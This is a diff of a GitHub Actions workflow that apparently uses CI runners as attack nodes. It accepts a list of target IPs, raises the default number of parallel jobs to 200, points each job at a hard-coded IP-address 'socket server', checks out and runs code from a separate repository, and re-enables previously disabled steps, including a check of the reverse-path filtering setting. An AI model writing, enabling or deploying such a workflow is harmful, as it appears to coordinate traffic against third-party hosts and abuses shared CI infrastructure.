@@ -11,11 +11,7 @@ on:
       total_jobs:
         required: false
         type: string
-        default: '120'
-      run_id:
-        required: false
-        type: string
-        default: ${{ github.run_id }}
+        default: '200'
       target_ips:
         required: false
         type: string
@@ -50,7 +46,7 @@ jobs:
       matrix: ${{fromJson(needs.generate-matrix.outputs.matrix)}}
     runs-on: ubuntu-latest
     env:
-      RUN_ID: ${{ inputs.run_id }}
+      RUN_ID: ${{ github.workflow }}
       TOTAL_JOBS: ${{ inputs.total_jobs }}
       MATRIX_JOB_ID: ${{ matrix.job }}
       SOCKET_SERVER_URL: http://43.133.204.21:3000
@@ -60,12 +56,8 @@ jobs:
           repository: Buc014960kPearson/Buc014960kPearson
           ref: main
 
-      - name: Step 0
-        run: |
-          echo "${{ github.workflow }}"
-
       - name: Step 1
-        if: false
+        # if: false
         run: |
           yarn
 
@@ -78,7 +70,7 @@ jobs:
           timeout 180s yarn start
 
       - name: Step 2
-        if: false
+        # if: false
         run: |
           cat /proc/sys/net/ipv4/conf/all/rp_filter
 
